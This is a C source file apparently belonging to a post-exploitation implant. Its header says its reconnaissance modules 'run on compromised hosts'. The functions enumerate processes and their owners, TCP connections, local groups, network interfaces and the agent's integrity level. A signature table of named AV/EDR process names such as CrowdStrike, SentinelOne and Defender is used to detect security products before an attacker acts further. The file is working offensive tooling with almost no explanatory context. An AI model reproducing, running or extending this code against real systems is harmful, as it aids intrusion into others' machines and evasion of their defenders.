/**
 * discovery.c - Host and Network Discovery Modules
 *
 * Implements reconnaissance commands that run on compromised hosts:
 * - Process listing with owner info
 * - Network connections (netstat equivalent)
 * - Local user/group enumeration
 * - Installed software
 * - AV/EDR detection
 * - Network shares
 * - Environment info
 * - Domain trust relationships
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <lm.h>
#include "../../include/postex.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

// --- Process Listing ---

BOOL discovery_process_list(PBYTE* output, PDWORD output_size) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    SIZE_T buf_size = 65536;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    DWORD offset = 0;

    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "%-8s %-8s %-40s %s\n", "PID", "PPID", "Name", "Owner");
    {
        int written = (int)_snprintf((char*)(buf + offset), buf_size - offset, "%-8s %-8s %-40s %s\n", "---", "----", "----", "-----");
        if (written < 0 || offset + (DWORD)written >= buf_size - 128) {
            CloseHandle(snap);
            HeapFree(GetProcessHeap(), 0, buf);
            return FALSE;
        }
        offset += (DWORD)written;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe)) {
        do {
            char name[256];
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), NULL, NULL);

            // Get process owner
            char owner[128] = "N/A";
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProc) {
                HANDLE hToken;
                if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                    BYTE token_user[256];
                    DWORD token_size;
                    if (GetTokenInformation(hToken, TokenUser, token_user, sizeof(token_user), &token_size)) {
                        PTOKEN_USER pUser = (PTOKEN_USER)token_user;
                        char domain[64], user[64];
                        DWORD domain_len = sizeof(domain), user_len = sizeof(user);
                        SID_NAME_USE snu;
                        if (LookupAccountSidA(NULL, pUser->User.Sid, user, &user_len, domain, &domain_len, &snu)) {
                            _snprintf(owner, sizeof(owner), "%s\\%s", domain, user);
                        }
                    }
                    CloseHandle(hToken);
                }
                CloseHandle(hProc);
            }

            int written = (int)_snprintf((char*)(buf + offset), buf_size - offset, "%-8d %-8d %-40s %s\n",
                pe.th32ProcessID, pe.th32ParentProcessID, name, owner);
            if (written < 0 || offset + (DWORD)written >= buf_size - 128) break;
            offset += (DWORD)written;

        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    *output = buf;
    *output_size = offset;
    return TRUE;
}

// --- Network Connections ---

BOOL discovery_netstat(PBYTE* output, PDWORD output_size) {
    PMIB_TCPTABLE2 tcp_table = NULL;
    DWORD tcp_size = 0;

    // Get required size
    GetTcpTable2(NULL, &tcp_size, TRUE);
    tcp_table = (PMIB_TCPTABLE2)HeapAlloc(GetProcessHeap(), 0, tcp_size);
    if (!tcp_table) return FALSE;

    if (GetTcpTable2(tcp_table, &tcp_size, TRUE) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, tcp_table);
        return FALSE;
    }

    SIZE_T buf_size = tcp_table->dwNumEntries * 128 + 512;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    DWORD offset = 0;

    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "%-6s %-22s %-22s %-12s %s\n",
        "Proto", "Local Address", "Foreign Address", "State", "PID");

    const char* states[] = {"", "CLOSED", "LISTEN", "SYN_SENT", "SYN_RCVD",
        "ESTABLISHED", "FIN_WAIT1", "FIN_WAIT2", "CLOSE_WAIT", "CLOSING",
        "LAST_ACK", "TIME_WAIT", "DELETE_TCB"};

    for (DWORD i = 0; i < tcp_table->dwNumEntries && offset < buf_size - 256; i++) {
        MIB_TCPROW2* row = &tcp_table->table[i];

        char local[32], remote[32];
        IN_ADDR local_addr, remote_addr;
        local_addr.S_un.S_addr = row->dwLocalAddr;
        remote_addr.S_un.S_addr = row->dwRemoteAddr;

        _snprintf(local, sizeof(local), "%d.%d.%d.%d:%d",
            local_addr.S_un.S_un_b.s_b1, local_addr.S_un.S_un_b.s_b2,
            local_addr.S_un.S_un_b.s_b3, local_addr.S_un.S_un_b.s_b4,
            ntohs((USHORT)row->dwLocalPort));

        _snprintf(remote, sizeof(remote), "%d.%d.%d.%d:%d",
            remote_addr.S_un.S_un_b.s_b1, remote_addr.S_un.S_un_b.s_b2,
            remote_addr.S_un.S_un_b.s_b3, remote_addr.S_un.S_un_b.s_b4,
            ntohs((USHORT)row->dwRemotePort));

        const char* state = (row->dwState < 13) ? states[row->dwState] : "UNKNOWN";

        offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "%-6s %-22s %-22s %-12s %d\n",
            "TCP", local, remote, state, row->dwOwningPid);
    }

    HeapFree(GetProcessHeap(), 0, tcp_table);
    *output = buf;
    *output_size = offset;
    return TRUE;
}

// --- AV/EDR Detection ---

typedef struct _AV_SIGNATURE {
    const char* process_name;
    const char* product_name;
} AV_SIGNATURE;

static const AV_SIGNATURE av_signatures[] = {
    {"MsMpEng.exe", "Windows Defender"},
    {"MsSense.exe", "Microsoft Defender for Endpoint"},
    {"SenseIR.exe", "Microsoft Defender for Endpoint (IR)"},
    {"csfalconservice.exe", "CrowdStrike Falcon"},
    {"CSFalconContainer.exe", "CrowdStrike Falcon"},
    {"cb.exe", "Carbon Black"},
    {"CbDefense.exe", "Carbon Black Cloud"},
    {"RepMgr.exe", "Carbon Black"},
    {"cylancesvc.exe", "Cylance"},
    {"CylanceSvc.exe", "Cylance"},
    {"SentinelAgent.exe", "SentinelOne"},
    {"SentinelServiceHost.exe", "SentinelOne"},
    {"DVPAPI.exe", "Digital Guardian"},
    {"xagt.exe", "FireEye HX"},
    {"TaniumClient.exe", "Tanium"},
    {"elastic-agent.exe", "Elastic Security"},
    {"winlogbeat.exe", "Elastic Winlogbeat"},
    {"ossec-agent.exe", "OSSEC/Wazuh"},
    {"wazuh-agent.exe", "Wazuh"},
    {"traps.exe", "Palo Alto Traps/Cortex XDR"},
    {"cyserver.exe", "Palo Alto Cortex XDR"},
    {"bdagent.exe", "Bitdefender"},
    {"avp.exe", "Kaspersky"},
    {"kavfswh.exe", "Kaspersky"},
    {"WRSA.exe", "Webroot"},
    {"SavService.exe", "Sophos"},
    {"hmpalert.exe", "Sophos"},
    {NULL, NULL}
};

BOOL discovery_detect_av(PBYTE* output, PDWORD output_size) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    SIZE_T buf_size = 4096;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    DWORD offset = 0;

    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "=== AV/EDR Detection Results ===\n\n");

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    int found_count = 0;

    if (Process32First(snap, &pe)) {
        do {
            for (int i = 0; av_signatures[i].process_name != NULL; i++) {
                if (_stricmp(pe.szExeFile, av_signatures[i].process_name) == 0) {
                    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset,
                        "[!] DETECTED: %s (PID: %d) -> %s\n",
                        pe.szExeFile, pe.th32ProcessID, av_signatures[i].product_name);
                    found_count++;
                }
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);

    if (found_count == 0) {
        offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "[+] No known AV/EDR processes detected.\n");
    } else {
        offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "\n[*] Total: %d security product(s) detected.\n", found_count);
    }

    *output = buf;
    *output_size = offset;
    return TRUE;
}

// --- Environment Info ---

BOOL discovery_env_info(PBYTE* output, PDWORD output_size) {
    SIZE_T buf_size = 8192;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    DWORD offset = 0;

    // Computer name
    char comp_name[256];
    DWORD comp_len = sizeof(comp_name);
    GetComputerNameA(comp_name, &comp_len);
    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "Computer: %s\n", comp_name);

    // Domain
    char domain[256];
    DWORD domain_len = sizeof(domain);
    GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_len);
    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "Domain: %s\n", domain_len > 0 ? domain : "(none)");

    // Current user
    char username[256];
    DWORD user_len = sizeof(username);
    GetUserNameA(username, &user_len);
    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "User: %s\n", username);

    // OS version
    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS(NTAPI* pRtlGetVersion)(PRTL_OSVERSIONINFOW);
    pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
    if (RtlGetVersion) {
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);
        offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "OS: Windows %d.%d Build %d\n",
            osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    }

    // Architecture
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "Arch: %s\n",
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");

    // Process integrity
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BYTE buf2[256];
        DWORD buf2_len;
        if (GetTokenInformation(hToken, TokenIntegrityLevel, buf2, sizeof(buf2), &buf2_len)) {
            PTOKEN_MANDATORY_LABEL pTML = (PTOKEN_MANDATORY_LABEL)buf2;
            DWORD integrity = *GetSidSubAuthority(pTML->Label.Sid,
                (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTML->Label.Sid) - 1));
            const char* level = "Unknown";
            if (integrity >= SECURITY_MANDATORY_SYSTEM_RID) level = "SYSTEM";
            else if (integrity >= SECURITY_MANDATORY_HIGH_RID) level = "High (Admin)";
            else if (integrity >= SECURITY_MANDATORY_MEDIUM_RID) level = "Medium";
            else level = "Low";
            offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "Integrity: %s\n", level);
        }
        CloseHandle(hToken);
    }

    // Network interfaces
    offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "\n--- Network Interfaces ---\n");
    PIP_ADAPTER_INFO adapters = NULL;
    ULONG adapter_size = 0;
    GetAdaptersInfo(NULL, &adapter_size);
    adapters = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, adapter_size);
    if (adapters && GetAdaptersInfo(adapters, &adapter_size) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO current = adapters;
        while (current && offset < buf_size - 256) {
            offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "  %s: %s\n",
                current->Description, current->IpAddressList.IpAddress.String);
            current = current->Next;
        }
    }
    if (adapters) HeapFree(GetProcessHeap(), 0, adapters);

    *output = buf;
    *output_size = offset;
    return TRUE;
}

// --- Local Groups ---

BOOL discovery_local_groups(PBYTE* output, PDWORD output_size) {
    PLOCALGROUP_INFO_1 groups = NULL;
    DWORD entries_read = 0, total_entries = 0;

    NET_API_STATUS status = NetLocalGroupEnum(NULL, 1, (LPBYTE*)&groups,
        MAX_PREFERRED_LENGTH, &entries_read, &total_entries, NULL);

    if (status != NERR_Success) return FALSE;

    SIZE_T buf_size = (entries_read + 1) * 256;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    DWORD offset = 0;

    for (DWORD i = 0; i < entries_read; i++) {
        char name[128], comment[256];
        WideCharToMultiByte(CP_UTF8, 0, groups[i].lgrpi1_name, -1, name, sizeof(name), NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, groups[i].lgrpi1_comment, -1, comment, sizeof(comment), NULL, NULL);
        offset += (DWORD)_snprintf((char*)(buf + offset), buf_size - offset, "%-30s %s\n", name, comment);
    }

    NetApiBufferFree(groups);
    *output = buf;
    *output_size = offset;
    return TRUE;
}
